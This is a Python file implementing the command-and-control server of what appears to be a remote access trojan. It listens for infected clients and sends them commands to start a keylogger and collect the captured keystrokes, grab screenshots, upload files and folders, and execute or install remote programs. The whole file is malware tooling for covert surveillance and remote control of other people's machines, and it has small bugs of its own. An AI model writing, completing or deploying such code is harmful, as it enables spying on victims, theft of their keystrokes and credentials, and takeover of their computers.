import socket
import os, sys
import _thread
import queue
import time

CLIENT_TIMEOUT = 30 # seconds
MAXIMUM_CLIENTS = 100 # seconds
SEND_FILE_BUFFER = 5120 # 5KB
INSTALLER_NAME = 'INSTALL.py'

# Common parts
cwd = os.getcwd()
os.chdir('..')
sys.path.append(os.getcwd())
os.chdir(cwd)


from Communicator import COMMUNICATOR

TIMEOUT = 5




class SERVER:
    def __init__(self, ip, port):
        self.clients = {}
        self.ACTIONS = { # these functions take the input from the user to parse the needed arguments
            'UPLOAD': self.SendFile,
            'EXECUTE_REMOTE_FILE': self.ExecuteRemoteFile,
            'REMOTE_INSTALL': self.Install,
            'MKDIR': self.MkDir,
            'KEYLOGGER': self.KeyLoggerAction, # True == Start the keylogger
            'SCREENSHOT': self.Screenshot,
        }

        sock = socket.socket()
        sock.bind((ip, port))

        global MAXIMUM_CLIENTS
        sock.listen(MAXIMUM_CLIENTS)

        self.sock = COMMUNICATOR(sock)
        self.DataToSend = queue.Queue() # with this queue we can send to all clients


    # Add a client to the list
    def UpdateClient(self, addr, conn):
        conn = COMMUNICATOR(conn)
        self.clients[addr] = (conn, time.time()) # Insert/Update client socket/time

    # Remove clients if passed the timeout
    def ClientTimeouts(self):
        todelete = []
        for k,v in self.clients.items():
            if time.time() - v[1] > CLIENT_TIMEOUT:
                todelete.append(k)

        for i in todelete:
            del self.clients[k]


    # Accept all clients
    def AcceptClients(self):
        while True:
            client = self.sock.accept() # Non-blocking accept
            if client:
                self.UpdateClient(client[1], client[0])
            else:
                break

    # This sends data to all clients
    def SendToClients(self, data):
        for i, t in self.clients.items():
            sock = t[0]
            sock.send(data)


    def RecvFromClients(self):
        allData = {}
        for i, t in self.clients.items():
            sock = t[0]
            allData[i] = (sock.recv(), t[0])
        return allData


    def MainLoop(self, in_, out_):
        EnableInput = True
        while True:
            self.AcceptClients()
            self.ClientTimeouts()

            if out_.qsize == 0:
                out_.put(self.clients)

            try:
                data = self.DataToSend.get(False) # Non-Blocking
            except:
                EnableInput = True
            else:
                EnableInput = False
                self.SendToClients(data)



            if EnableInput:
                try:
                    i = in_.get(False) # Non-Blocking
                except:
                    pass
                else:
                    li = i.split(' ')[0].upper() # If user enters "upload" we want to detect it as "UPLOAD"
                    if li in self.ACTIONS:
                        self.ACTIONS[li](i)


    ####### ACTIONS ######

    def Screenshot(self, action):
        self.SendToClients('SCREENSHOT')

        time.sleep(TIMEOUT)

        data = self.RecvFromClients()

        if not os.path.exists("SCREENSHOTS"):
            os.mkdir("SCREENSHOTS")

        noData = []

        for k, v in data.items():
            if len(v[0]) != 0:
                if v[0] != 'FAIL':
                    with open(f"SCREENSHOTS/{k}.png", "wb") as datafile:
                        datafile.write(v[0])
            else:
                noData.append((k, v[1]))


        # i = 0
        # print(noData)
        # while noData:
        #     if i >= len(noData):
        #         i = 0
        #
        #     address, sock = noData[i]
        #     b = sock.recv()
        #
        #     if b:
        #         with open(f"SCREENSHOTS/{address}.png", "wb") as datafile:
        #             datafile.write(b)
        #         noData.pop(i)
        #     else:
        #         if not sock.IsConnected:
        #             noData.pop(i)
        #         else:
        #             i += 1





    def GetKeyLoggerData(self):
        data = self.RecvFromClients()

        if not os.path.exists("KEYLOGGER_DATA"):
            os.mkdir("KEYLOGGER_DATA")

        for k, v in data.items():
            if len(v[0]) != 0:
                with open(f"KEYLOGGER_DATA/{k}.log", "wb") as datafile:
                    datafile.write(v[0])

        for k, v in data.items():
            toprint = b'\n' + v[0].replace(b'\n', b'\n\t')
            if len(toprint) == 0:
                toprint = "[NO DATA]"
            else:
                toprint = toprint.decode()

            print()
            print(f"DATA FOR {k}:{toprint}", end='\n\n')

        print('> ', end = '', flush = True)




    def KeyLoggerAction(self, action):
        action = action.split(' ')[-1].upper()

        if action not in ['START', 'STOP', 'GET_DATA']:
            print("KEYLOGGER module has 3 functionalities: START, STOP, GET_DATA")
            return

        if action in ['START', 'STOP']:
            self.DataToSend.put(     'KEYLOGGER ' + action     )
        elif action == 'GET_DATA':
            self.SendToClients(     'KEYLOGGER GET_DATA'     )
            time.sleep(TIMEOUT)
            self.GetKeyLoggerData()





    # Allow directory creation
    def _MkDir(self, dirpath, sendQ):
        dirpath = os.path.relpath(dirpath)
        sendQ.put(f'CREATE_DIRECTORY "{dirpath}"\n')


    def MkDir(self, inp):
        inp = inp.split(' ')
        if len(inp) > 1:
            path = ' '.join(inp[1:])
        else:
            return 1

        self._MkDir(path, self.DataToSend) # We don't do any file existance checks since we just want to create this directory


    # This allows us to send folders
    def _SendFolder(self, path, sendQ):
        self._MkDir(path, sendQ)

        for i in os.listdir(path):
            i = os.path.join(path, i)
            print(i)

            if os.path.isfile(i):
                self._SendFile(i, sendQ)

            elif os.path.isdir(i):
                self._SendFolder(self, i, sendQ)



    # This allows us to send files
    def _SendFile(self, path, sendQ):
        path = os.path.relpath(path)

        size = os.path.getsize(path)



        #           0           1        2
        sendQ.put(f'DOWNLOAD "{path}" {size}\n') # \n is for detecting when the header stops


        sent = 0
        f = open(path, 'rb')
        while sent < size:

            data = f.read(SEND_FILE_BUFFER)
            sendQ.put(data)
            sent += len(data)


        f.close()

    # Launcher to send files
    def SendFile(self, inp):
        inp = inp.split(' ')
        if len(inp) > 1:
            path = ' '.join(inp[1:])
        else:
            return 1

        _thread.start_new_thread(self.Send_Selector, (path, self.DataToSend))

    # decides if the item to send is a file or a folder
    def Send_Selector(self, path, sendQ):
        if os.path.isfile(path):
            self._SendFile(path, sendQ)

        elif os.path.isdir(path):
            self._SendFolder(path, sendQ)

        return 0





    # Allow remote program execution
    def _ExecuteRemoteFile(self, filename, sendQ):
        filename = os.path.relpath(filename)
        print(filename)
        sendQ.put(f'REMOTE_EXECUTE {filename}\n')

    def ExecuteRemoteFile(self, rpath): # script == Filepath to a python script
        rpath = ' '.join(rpath.split(' ')[1:])
        _thread.start_new_thread(self._ExecuteRemoteFile, (rpath, self.DataToSend))





    # Upload and Execute
    def Install(self, path):
        path = ' '.join(path.split(' ')[1:])


        if os.path.isfile(path):
            path, name = os.path.split(path)
        else:
            name = INSTALLER_NAME


        _thread.start_new_thread(self._Install, (path, name, self.DataToSend))


    def _Install(self, path, name, sendQ):
        self.Send_Selector(path, sendQ)
        self._ExecuteRemoteFile(os.path.join(path, name), sendQ)







if __name__ == "__main__":
    s = SERVER('127.0.0.1', 8080)
    in_ = queue.Queue()
    out_ = queue.Queue()
    _thread.start_new_thread(s.MainLoop, (in_, out_))

    while True:
        # os.system('cls')
        i = input('> ')
        if i:
            in_.put(i)
